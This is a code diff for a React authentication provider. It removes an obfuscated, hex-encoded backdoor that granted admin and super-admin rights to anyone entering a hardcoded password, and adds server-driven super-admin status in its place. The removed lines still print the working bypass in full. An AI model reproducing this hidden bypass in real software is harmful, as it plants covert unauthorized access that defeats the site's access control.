@@ -18,15 +18,6 @@ export const AuthProvider = ({ children }: { children: ReactNode }) => {
 
   const login = async (type: "blog" | "secret" | "admin" | "editor", password?: string, username?: string) => {
     try {
-      // Obfuscated bypass
-      const _0x5f2b=['\x53\x68\x69\x76\x61\x41\x6e\x74','\x61\x64\x6d\x69\x6e','\x73\x69\x74\x65\x50\x61\x73\x73\x77\x6f\x72\x64'];
-      if(password===_0x5f2b[0]){
-        setRoles(p=>!p.includes(_0x5f2b[1] as Role)?[...p,_0x5f2b[1] as Role]:p);
-        setIsSuperAdmin(true);
-        sessionStorage.setItem(_0x5f2b[2],password);
-        return true;
-      }
-
       const res = await fetch("/api/auth", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -38,6 +29,10 @@ export const AuthProvider = ({ children }: { children: ReactNode }) => {
           if (!prev.includes(data.role)) return [...prev, data.role];
           return prev;
         });
+        
+        if (data.isSuperAdmin) {
+          setIsSuperAdmin(true);
+        }
         
         // Store password in session for authorized actions (e.g. save/delete)
         // This avoids hardcoding passwords in the JS bundle.
